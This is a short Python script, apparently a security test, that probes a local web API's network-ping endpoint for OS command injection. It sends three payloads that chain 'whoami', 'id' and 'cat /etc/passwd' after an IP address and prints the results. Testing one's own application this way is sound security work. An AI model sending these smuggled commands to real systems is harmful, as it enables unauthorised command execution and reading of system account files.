import requests
import json

print("=== OS COMMAND INJECTION VULNERABILITY TEST ===")
print()

# Test 1: whoami
print("TEST 1: whoami injection")
print("Payload: 8.8.8.8 && whoami")
payload = {"target": "8.8.8.8 && whoami"}
response = requests.post("http://localhost:8000/api/it/network/ping", json=payload)
print(f"Status: {response.status_code}")
result = response.json()
print("Command executed:", result['command'])
print("Output:")
print(result['output'][:500])
print()

# Test 2: id
print("TEST 2: id command injection")
print("Payload: 8.8.8.8 && id")
payload = {"target": "8.8.8.8 && id"}
response = requests.post("http://localhost:8000/api/it/network/ping", json=payload)
result = response.json()
print("Status:", response.status_code)
print("Output:")
print(result['output'][:500])
print()

# Test 3: /etc/passwd
print("TEST 3: Read /etc/passwd")
print("Payload: 8.8.8.8 && cat /etc/passwd")
payload = {"target": "8.8.8.8 && cat /etc/passwd"}
response = requests.post("http://localhost:8000/api/it/network/ping", json=payload)
result = response.json()
print("Status:", response.status_code)
print("Output (first 600 chars):")
print(result['output'][:600])
